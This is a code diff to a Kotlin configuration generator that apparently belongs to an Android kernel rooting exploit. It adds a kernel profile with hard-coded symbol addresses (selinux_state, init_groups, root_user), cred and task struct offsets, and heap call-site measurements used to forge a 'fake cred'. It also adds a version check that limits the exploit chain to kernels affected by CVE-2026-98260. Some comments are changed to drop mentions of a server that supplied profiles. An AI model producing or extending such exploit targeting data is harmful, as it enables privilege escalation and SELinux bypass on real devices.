@@ -87,7 +87,7 @@ object ConfigGen {
      * 拼 fake cred 真正绕不开的锚点。
      *
      * `init_ucounts` 不在里面：它是 5.14 才引入的字段，5.10 的 `struct cred` 里
-     * 根本没有 `ucounts`（服务器给 5.10 的 `credUcounts` 就是 `credGroups` 同一个值），
+     * 根本没有 `ucounts`（5.10 的 `credUcounts` 就是 `credGroups` 同一个值），
      * 硬写进去等于把所有者的 `group_info` 覆盖成内核指针，必崩。payload 侧见到
      * `INIT_UCOUNTS_STATIC == 0` 会跳过这一项。
      */
@@ -354,6 +354,44 @@ object ConfigGen {
     )
 
     private val BUILTIN_PROFILES: List<Profile> = listOf(
+        // 用户提供的 boot.img（5.10.66-android12-9-gc55fd18209d0）：无 .BTF，
+        // 偏移来自 offsetsFromCode，call site 由反汇编 bl 自动算出。
+        Profile(
+            name = "5.10.66-android12-9 / BTF-less",
+            prefix = "5.10.66-android12-9-gc55fd18209d0",
+            release = "5.10.66-android12-9-gc55fd18209d0",
+            symbols = mapOf(
+                "do_timer_create" to 0xFFFFFFC010458D5CuL.toLong(),
+                "selinux_state" to 0xFFFFFFC0136DA5A0uL.toLong(),
+                "panic_on_warn" to 0xFFFFFFC012C09DD8uL.toLong(),
+                "root_user" to 0xFFFFFFC012C2BF68uL.toLong(),
+                "init_user_ns" to 0xFFFFFFC012C2BD38uL.toLong(),
+                "init_ucounts" to 0x0uL.toLong(),
+                "init_groups" to 0xFFFFFFC012C2D1E0uL.toLong(),
+            ),
+            offsets = Offsets(
+                // 5.10.66 的 init_posix_timers 也不在 kallsyms 里 → 尺寸算不出，先留 0：
+                // payload 见 itimerSize=0 时只按 call site 认对象（与 ALT-AN00 首版一致）。
+                itimerSize = 0, itimerNode = 0x78, itimerHead = 0, itimerElist = 0, itimerFiring = 0, itimerHandling = 0,
+                taskCred = 0x7B8,
+                taskComm = 0x7C8,
+                credSize = 0xA8,
+                credUid = 0x4,
+                credSecurity = 0x78,
+                credUser = 0x80,
+                credUserNs = 0x88,
+                credUcounts = 0x90,
+                credGroups = 0x90,
+            ),
+            measured = Measured(
+                timerSiteOffset = 0x98,
+                credSiteLow21 = 0x25B08,
+                taskAllocLow21 = 0x1449C4,
+                taskAllocBytes = 0x1340,
+                credReq = 0xA8,
+                credAlloc = 0xC0,
+            ),
+        ),
         // 5.10.252：没有 .BTF，偏移全部由 tools 的 offsetsFromCode 从指令里挖出来
         // （`kmem_cache_create` 的 size 在 w1、`exit_creds` 的第二个 STR XZR 才是 cred）。
         Profile(
@@ -474,7 +512,7 @@ object ConfigGen {
         ),
         // MTN-AN00 与 MTN-AN80 用的是同一份 boot.img（sha256 136b7db0…），
         // 内核也逐字节相同（Image d12938d9…，仅切法差 56 字节前缀），
-        // 因此 call site 必须一致；服务器 profile.json 与本地重解都是 0x94 / 0x10B7F8 / 0x19ECC0。
+        // 因此 call site 必须一致；外部档案与本地重解都是 0x94 / 0x10B7F8 / 0x19ECC0。
 
         Profile(
             name = "MTN-AN00/AN80 / 6.1.157-android14-11",
@@ -540,7 +578,7 @@ object ConfigGen {
             ),
         ),
 
-        // ==== 服务器收录的额外内核（tools/gen_profiles.py 生成） ====
+        // ==== 额外内核档案（tools/gen_profiles.py 生成） ====
 
         Profile(
             name = "SER-AN00 / AAK-AN00 / 6.6.118-android15-8",
@@ -2632,7 +2670,7 @@ object ConfigGen {
     )
 
     /**
-     * 全部内置内核档案 = 本地标定出来的 + 服务器 `profile.json` 拼出来的（5.10 那批）。
+     * 全部内置内核档案 = 本地标定出来的 + 额外档案拼出来的（5.10 那批）。
      * 后者没有 BTF 也能成立，因为偏移与 call site 都随档案下发。
      */
     val PROFILES: List<Profile> = BUILTIN_PROFILES
@@ -2707,10 +2745,10 @@ data class Known(
         Known("unknown", "5.10.236-android12-9-g4b262e5255ed", "5.10.236-android12-9-g4b262e5255ed", "8345f871120c", "server/5.10", 0, 0, false),
     )
 
-    /** 服务器收录过、但这台机器只能用标定补全的内核。 */
+    /** 已收录、但这台机器只能用标定补全的内核。 */
     fun knownFor(release: String?, @Suppress("UNUSED_PARAMETER") model: String? = null): Known? {
         if (release.isNullOrBlank()) return null
-        // 先按内核 key 认：同一颗内核不管装在哪个型号上都算「服务器已收录」
+        // 先按内核 key 认：同一颗内核不管装在哪个型号上都算「已收录」
         val key = kernelKey(release)
         val exact = KNOWN.filter { kernelKey(it.release) == key }
         val hits = if (exact.isNotEmpty()) exact else KNOWN.filter { release.startsWith(it.release) }
@@ -2748,6 +2786,38 @@ fun modelKey(model: String?): String? {
      * ROM 之间细节会飘（后缀 -4k、abogki 段、是否被截断），所以按「去掉尾部 -Nk 后
      * 前 22 个字符一致」判定，两个方向都试，避免 标定 写进去、运行时又认不出来。
      */
+    /**
+     * CVE-2026-98260 的受影响区间（上游披露）：
+     *   5.7 <= k < 6.6.158；6.12.* < 6.12.112；6.18.* < 6.18.54；7.2.* < 7.2.8；7.3-rc4 之前。
+     * 区间外（5.4、6.6.158+、6.12.112+、6.18.54+、7.2.8+ 等）没有这个 bug，
+     * 既不该出现在内置表里，也不该让用户去跑一遍注定失败的链。
+     */
+    fun isVulnerable(release: String?): Boolean {
+        val v = parseVersion(release) ?: return true      // 认不出就不拦，交给后续匹配
+        val (major, minor, patch) = v
+        return when {
+            major < 5 -> false
+            major == 5 && minor < 7 -> false
+            major < 6 -> true                              // 5.7 .. 5.x
+            major == 6 && minor < 6 -> true                // 6.0 .. 6.5
+            major == 6 && minor == 6 -> patch < 158
+            major == 6 && minor == 12 -> patch < 112
+            major == 6 && minor == 18 -> patch < 54
+            major == 7 && minor == 2 -> patch < 8
+            major == 7 && minor == 3 -> patch == 0 && false // 7.3 只有 7.3-rc4 之前受影响，正式版未知，先不认
+            else -> false
+        }
+    }
+
+    private fun parseVersion(release: String?): Triple<Int, Int, Int>? {
+        if (release.isNullOrBlank()) return null
+        val m = Regex("^(\\d+)\\.(\\d+)(?:\\.(\\d+))?").find(release.trim()) ?: return null
+        val a = m.groupValues[1].toIntOrNull() ?: return null
+        val b = m.groupValues[2].toIntOrNull() ?: return null
+        val c = m.groupValues[3].toIntOrNull() ?: 0
+        return Triple(a, b, c)
+    }
+
     fun sameKernel(a: String, b: String): Boolean {
         val ka = kernelKey(a)
         val kb = kernelKey(b)
